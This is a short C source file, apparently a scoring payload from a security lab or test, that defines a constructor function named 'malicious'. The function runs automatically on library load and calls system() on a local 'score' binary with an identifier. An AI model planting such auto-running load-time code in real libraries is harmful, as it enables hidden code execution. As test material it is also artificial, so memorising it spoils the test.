#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 2a8ab549-3098-4b02-b65a-1d3f1b0c86fb");
}
